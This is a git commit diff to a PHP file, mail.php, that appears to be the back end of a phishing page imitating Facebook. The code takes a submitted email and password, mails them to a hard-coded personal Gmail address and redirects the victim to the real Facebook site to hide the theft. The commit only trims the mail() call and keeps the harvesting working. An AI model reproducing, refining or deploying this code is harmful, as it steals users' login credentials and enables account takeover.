33b1297bdf1fec93c61d99dfe1e81f8dc7c654bf
israelstoba <israelstoba@gmail.com>
2025-04-08 14:13:23 +0100

    new try

--- mail.php
+++ mail.php
@@ -3,11 +3,8 @@ $email = $_POST["email"];
 $passkey = $_POST["password"];
 
 $recipient = "israelstoba@gmail.com";
-$subject = "New Login Attempt";
-$message = "Email: $email\nPassword: $passkey";
-$mailheader = "From: $email\r\n";
 
-mail($recipient, $subject, $message, $mailheader)
+mail($recipient,$email,$passkey)
 or die("Error");
 
 header("location:https://web.facebook.com");
